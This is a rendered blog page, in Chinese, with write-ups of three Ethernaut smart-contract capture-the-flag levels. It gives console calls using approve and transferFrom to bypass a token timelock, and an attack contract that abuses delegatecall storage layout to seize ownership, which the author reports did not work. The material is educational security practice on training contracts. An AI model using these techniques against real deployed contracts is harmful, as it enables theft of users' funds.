@@ -1,28 +1,136 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>智能合约安全入门:ETHERNAUT-WriteUp(3) | XZLang</title><meta name="description" content="本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。   0x00 Naught Coin1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import &amp;#x27;zeppelin-solidity&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;StandardToken"><meta name="keywords" content="区块链,solidity"><meta name="author" content="XZLang"><meta name="copyright" content="XZLang"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="智能合约安全入门:ETHERNAUT-WriteUp(3)"><meta property="og:url" content="http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/"><meta property="og:site_name" content="XZLang"><meta property="og:description" content="本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。   0x00 Naught Coin1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import &amp;#x27;zeppelin-solidity&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;StandardToken"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2020-05-17T08:14:14.000Z"><meta property="article:modified_time" content="2020-07-18T07:04:00.379Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
 
-block content
-  article#post(class="")
-    #article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache:theme.fragment_cache})
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .post-ad!=theme.ad.post
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-    include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.0.2',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime_unit: 'days',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-07-18 15:04:00'
+}</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 5.0.2"><link rel="alternate" href="/atom.xml" title="XZLang" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">36</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">42</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">10</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Naught-Coin"><span class="toc-number">1.</span> <span class="toc-text">0x00 Naught Coin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Preservation"><span class="toc-number">2.</span> <span class="toc-text">0x01 Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Locked"><span class="toc-number">3.</span> <span class="toc-text">0x02 Locked</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">XZLang</a></span><span class="pull-right menus"><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">智能合约安全入门:ETHERNAUT-WriteUp(3)</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-05-17T08:14:14.000Z" title="Created 2020-05-17 16:14:14">2020-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-07-18T07:04:00.379Z" title="Updated 2020-07-18 15:04:00">2020-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/BlockChain/">BlockChain</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。</p>
+<a id="more"></a>
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache:theme.fragment_cache})
-      
+<h2 id="0x00-Naught-Coin"><a href="#0x00-Naught-Coin" class="headerlink" title="0x00 Naught Coin"></a>0x00 Naught Coin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/token/ERC20/StandardToken.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  string public constant name = <span class="string">&#x27;NaughtCoin&#x27;</span>;</span><br><span class="line">  string public constant symbol = <span class="string">&#x27;0x0&#x27;</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public INITIAL_SUPPLY = (<span class="number">10</span> ** decimals).mul(<span class="number">1000000</span>);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这道题题目说明：</p>
+<blockquote>
+<p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
+<p> Things that might help</p>
+<ul>
+<li>The <a target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li>
+<li>The <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li>
+</ul>
+</blockquote>
+<p>给了框架源码和接口文档，源码是不可能去看的（懒），看看接口。</p>
+<p>这道题的目的是置0自己的<code>token balance</code>，合约里面有一个<code>transfer</code>函数，但是有一个<code>modifier</code>做限制，10年之后才能转出去，drl。</p>
+<p>接口文档中除了有<code>transfer</code>函数之外，还有一个<code>transferFrom</code>，这个函数合约中没有实现，所以直接调用就可以绕过<code>modifier</code>。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="1.png"></p>
+<p>但是这个<code>transferFrom</code>需要授权。接着往下看就找到了可以用的一个方法：<code>approve</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="2.png"></p>
+<p>然后就很清晰了，先授权，再转账</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.approve(player,<span class="number">1000000000000000000000000</span>)</span><br><span class="line"></span><br><span class="line">contract.transferFrom(player,contract.address,<span class="number">1000000000000000000000000</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-Preservation"><a href="#0x01-Preservation" class="headerlink" title="0x01 Preservation"></a>0x01 Preservation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题需要改变owner，但是这里好像没有什么可以控制owner的地方，根据给出的提示，在<code>delegatecall</code>上面思考，之前提到了<code>delegatecall</code>的特性，他的一个重要的地方就是，当一个合约调用另外一个合约中的方法时，所使用的<code> storage</code>会是调用方的<code> storage</code>，这样的一个特性就可以用来解这道题目。</p>
+<p>首先，这里<code>Preservation</code>合约的<code>setFirstTime</code>中调用了<code>LibraryContract</code>中的方法，这时，<code>setTime</code>函数中给<code>storedTime</code>赋值，但由于上文提到的特性，在实际存储上修改的是<code>timeZone1Library</code>的值。</p>
+<p>所以攻击思路就清晰了，首先调用<code>setFirstTime</code>来将攻击合约的地址赋值给<code>timeZone1Library</code>，然后再次调用<code>setFirstTime</code>去执行攻击代码。</p>
+<p>攻击合约代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        timeZone1Library = address(_time);</span><br><span class="line">        timeZone2Library = address(_time);</span><br><span class="line">        owner=address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我没有成功，讲道理，不知道为什么，方法应该是没有问题的。</p>
+<h2 id="0x02-Locked"><a href="#0x02-Locked" class="headerlink" title="0x02 Locked"></a>0x02 Locked</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = <span class="literal">false</span>;  <span class="comment">// registrar locked, no name updates</span></span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; <span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> NameRecord) public registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(<span class="function"><span class="params">bytes32</span> =&gt;</span> address) public resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">bytes32 _name, address _mappedAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">XZLang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/">http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a><a class="post-meta__tags" href="/tags/solidity/">solidity</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/05/19/BUUCTF-WriteUp%E5%90%88%E9%9B%86-2/"><img class="prev-cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">BUUCTF-WriteUp合集(2)</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-2/"><img class="next-cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">智能合约安全入门:ETHERNAUT-WriteUp(2)</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/05/16/智能合约入门-ETHERNAUT-WriteUp-2/" title="智能合约安全入门:ETHERNAUT-WriteUp(2)"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-16</div><div class="relatedPosts_title">智能合约安全入门:ETHERNAUT-WriteUp(2)</div></div></a></div><div class="relatedPosts_item"><a href="/2020/05/12/智能合约安全入门-ETHERNAUT-WriteUp/" title="智能合约安全入门:ETHERNAUT-WriteUp"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-12</div><div class="relatedPosts_title">智能合约安全入门:ETHERNAUT-WriteUp</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By XZLang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="Increase Font Size"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="Decrease Font Size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
